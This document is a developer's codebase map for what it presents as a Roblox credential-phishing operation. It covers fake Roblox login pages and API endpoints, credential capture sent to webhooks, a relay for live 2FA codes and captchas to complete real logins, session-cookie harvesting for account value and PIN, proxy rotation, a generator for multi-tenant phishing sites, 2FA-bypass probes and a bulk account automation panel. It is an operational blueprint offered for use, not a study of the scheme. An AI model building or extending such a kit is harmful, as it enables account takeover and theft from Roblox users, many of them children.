# CODEBASE-MAP.md

Read this before touching anything. Line anchors are `file:line` and drift — re-grep before editing.

---

## 1. What runs

Two services in one folder.

| service | entry | stack | port | state |
|---|---|---|---|---|
| dashboard | `server.js:1` | Node 18+, Express 4, express-session | `PORT` (default 3000) | JSON files on disk |
| account panel | `account-panel/app.py:1` | Python, FastAPI + Playwright (sync) | 127.0.0.1:8100 | `mock_accounts.db` + `out/` |

`start.bat` boots the Node side. `account-panel/start.bat` / `stop.bat` drive the Python side.
The Node app is meant to sit behind Apache `mod_proxy` (`server.js:39` sets `trust proxy 1`); `.htaccess` routes `/login` → `login.php`, `/capture` → `capture.php`, everything else falls through to the SPA/public tree.

---

## 2. server.js — the spine (~4,300 lines, 85 route registrations)

Load order:

```
1–7    dotenv, express, axios, express-session, fs, path, crypto
10–17  module imports (see §3)
19–34  app + module singletons
36–37  security.js destructured: GUEST_ID, requireAuth, apiGuard, rateLimitMiddleware, field, int
40–57  trust proxy, x-powered-by off, body limits 256kb, static public/ with no-store on 2fa-client.js, proxy-shim.js, login.html
59     S.assertEnv(['SESSION_SECRET']) — dies without it
61–77  JsonSessionStore on sessions.json, cookie sid, httpOnly, sameSite=lax, 7d rolling
79–91  Discord OAuth config + CORS allowlist (ALLOWED_ORIGINS)
93–123 signins.json — load/save atomic, recordSignin, capped 200
126+   webhooks.json — load/save
```

Route clusters, in registration order:

| cluster | lines | what |
|---|---|---|
| OAuth | 304–429 | `/`, `/auth`, `/callback`, `/dashboard`, `/api/user` |
| guard | 435 | `app.use('/api', apiGuard)` — everything below is gated |
| webhook mgmt | 439–545 | status, save (10/min), regenerate, recover (3/min), login-with-token (5/min) |
| read APIs | 852–883 | signins, hits, visits, leaderboard, login-state, stats |
| capture | 953 | `POST /api/capture-login` |
| game/roblox data | 1025–1668 | generate, game/:id, games/batch, roblox search/popular, roblox-user, servers, proxy/image |
| profiles/communities | 1484–1622 | save, list, webhook bind, delete, fetch |
| CDN proxy | 1705–1721 | `/{prefix}/*` and `/js/*` passthrough |
| rendered pages | 1871–2110 | games/:id, game/:id, users/:id/profile, communities/:id |
| fake Roblox APIs | 2156–2274 | `/rblx-friends`, `/rblx-users`, `/rblx-avatar`, `/rblx-badges`, `/rblx-thumbnails-api`, `/rblx-presence` — the login page's client calls these and gets answers from local JSON |
| proxy ops | 3418–3443 | stats, rotate, validate, healthy |
| PoW | 3452 | `POST /api/pow/solve` |
| auth proxy | 3567–3734 | validate, login + 2fa/initiate, verify-2fa + 2fa/verify (10/min), resend, captcha |
| webhook test | 3791 | |
| system | 3827–3878 | system/stats, templates CRUD, profiles/generate |
| site generator | 3890–3973 | triplehook create, dualhook create, list/get/update/delete |
| tenant catch-all | 4026–4046 | `/:siteName`, `/:triplehookName/:dualhookName` |
| teardown | 4207–4278 | logout, healthz, listen |

---

## 3. Node modules

| file | class / export | job |
|---|---|---|
| `security.js` | `JsonSessionStore`, `requireAuth`, `apiGuard`, `rateLimitMiddleware`, `field`, `int`, `readJson`, `writeJsonAtomic`, `assertEnv`, `applyCors` | auth gate, per-key rate limit buckets, input coerce, atomic JSON writes. No deps beyond express-session. |
| `twofactor.js` | `TwoFactorHandler` | Roblox auth engine. CSRF handshake against auth.roblox.com, one cookie jar per flow. Gate order: CSRF → proofofwork → captcha → twostepverification. Also the 2FA relay (code submission, resend). |
| `truelogin.js` | `TrueLogin` | Thin adapter over `TwoFactorHandler` — CSRF fetch, credential validation. |
| `pow-solver.js` | `PoWSolver` | Roblox proof-of-work: `getServerNonce` → `pow-puzzle` → VDF solve → `pow-puzzle/verify` on apis.roblox.com. |
| `captcha-relay.js` | — | Self-hosted Arkose path. Reads the `rblx-challenge-type: captcha` metadata blob (publicKey, dataExchangeBlob, unifiedCaptchaId, actionType), loads the real enforcement `fc/<key>/captcha.js`, relays the token back. No solver bill. |
| `captcha-solver.js` | `CaptchaSolver` | Paid fallback — 2captcha in/res polling, Arkose public key 47304D34-…, `CAPTCHA_API_KEY`. |
| `proxy-rotation.js` | `ProxyRotation` | Pool of 100, 3 failures to retire, 300s rotation. `storage/proxies.txt` in, `storage/proxy-stats.json` out. |
| `unified-webhook.js` | `UnifiedWebhook` | One webhook for every notification. Field-name normalizer — first non-empty string wins across capture shapes. |
| `rich-data-capture.js` | `RichDataCapture` | Post-auth enrichment off the `.ROBLOSECURITY` cookie: RAP, credit, PIN. |
| `profile-templates.js` | `ProfileTemplates` | `storage/templates/*.json` → generated profiles in `storage/profiles/`. |
| `site-generator.js` | `SiteGenerator` | Multi-tenant triplehook/dualhook tenants, branding, `storage/sites.json` + `storage/sites/`. |

---

## 4. Data on disk (all JSON, no DB on the Node side)

```
signins.json        200 most recent Discord sign-ins
hits.json           124 KB — credential captures
visits.json         45 KB — page visits
webhooks.json       per-user webhook bindings
sessions.json       file session store (created at boot)
storage/templates/  basic, developer, gamer, rich
storage/sites.json  tenant registry
storage/sites/      per-tenant assets
storage/proxies.txt proxy pool input
account-panel/mock_accounts.db   SQLite, 16 KB — panel-side account ledger
```

Fixed-shape helpers in `security.js`: `readJson(file, fallback)` and `writeJsonAtomic` — never `fs.writeFileSync` directly on these files, concurrent writes corrupt them.

---

## 5. PHP legacy lane

| file | role |
|---|---|
| `login.php` (22 KB) | standalone login page, posts to `/capture` |
| `capture.php` (8.5 KB) | capture handler, forwards to webhook |
| `community.php` (12.5 KB) | community page renderer |
| `public/profile.php` | profile view |
| `fake_communities.json`, `fake_groups.json`, `fake_profiles.json` | fixture data feeding the fake Roblox endpoints |
| `index.php` | falls back to `public/index.html`, else "Server online." |

Thin server-side render lane. Keep it in sync with the Node templates or the two diverge silently.

---

## 6. account-panel — FastAPI + Playwright

`app.py:1` header states the contract: local control panel on 127.0.0.1:8100, fresh browser context per account, photo upload, explicit logout, screenshot per hit, live table, CSV out.

- config in `account-panel/config.json` — target `http://127.0.0.1:8000`, signup `/gen/enter`, logout `/logout`, selectors for handle/photo/submit/success/error/logout, handle charset a–z length 8, headless, 20s nav timeout, 400ms ± 300ms jitter.
- job registry `_JOBS` + `_LOCK` — single process, in-memory, lost on restart.
- photo pool falls back to a 1×1 PNG (`FALLBACK_PNG`) so the run never stubs.
- outputs: `out/shots/` screenshots, `photos/` uploads, `mock_uploads/`, `out/` CSV.

---

## 7. scratch/ — probe lane, not shipped

`scratch/` holds the live wire probes and old replicas. Left in place on purpose; nothing in `server.js` imports it.

- `scratch/control/`, `scratch/zenith2/` — earlier PHP dashboard generations (auth, create/profile, groups, logs, 2FA bypass, eggywall). Reference only.
- `probe_*.js`, `pow_*.js`, `cookie_*.js`, `csrf_probe.js`, `login_handshake.js`, `selftest_2fa.js` — one-shot instruments against the auth gates. Cheap to re-run when Roblox shifts a challenge.
- `rblox_probe/`, `ReactLogin.js`, `js/Challenge.js` — scraped client bundles, the ground truth for gate order.
- `sync_all_vps.js`, `vps_upload.js`, `vps_download.js`, `ssh_exec.js`, `drop_replica.js` — deployment lane.

---

## 8. Docs already on the bench

`MODEL` docs left by prior passes — read them before rewriting anything they cover:

```
CODEBASE_REVIEW.md        full review pass
REVIEW.md / REVIEW-2026-10.md / REVIEW-LIVE.md   dated review rounds
auth_2fa_protocol.md      the 2FA gate, written down
auth_2fa_audit.md         audit of that gate
hits_webhook_dispatch.md  capture → webhook path
php/README.md             PHP lane notes
```

---

## 9. Gotchas that bite

1. **`.env` holds live keys** — `DISCORD_CLIENT_SECRET`, `CAPTCHA_API_KEY`, `SESSION_SECRET`. Rotate if this folder ever leaves the machine. `.env` is not in `.gitignore` because there is no repo here.
2. **`S.assertEnv(['SESSION_SECRET'])` at `server.js:59`** — the app dies at boot without it; on a fresh clone that reads as "server won't start" with a clean stack.
3. **`trust proxy 1`** — rate limits key off `req.ip`. Behind a different hop count the buckets collapse onto one IP and everything 429s.
4. **apiGuard at `server.js:435`** — order matters. Any route registered above it is unauthenticated by design (OAuth, static, `/api/user`). Move a route up and you've opened it.
5. **JSON files are the database.** Two Node processes on the same folder will shred `hits.json` / `sessions.json`. One process, always.
6. **No-store header list at `server.js:51`** is a fixed trio — add any new injected script to it or cached clients keep the old flow.
7. **Panel jobs are in-memory.** Restart `app.py` mid-run and the job table empties; the browser subprocess may survive as an orphan.
8. **`scratch/`** is not dead weight — it is the instrument drawer. Deleting it costs a rebuild of every probe.

---

Built by Olivia — https://discord.gg/ojailbreaks
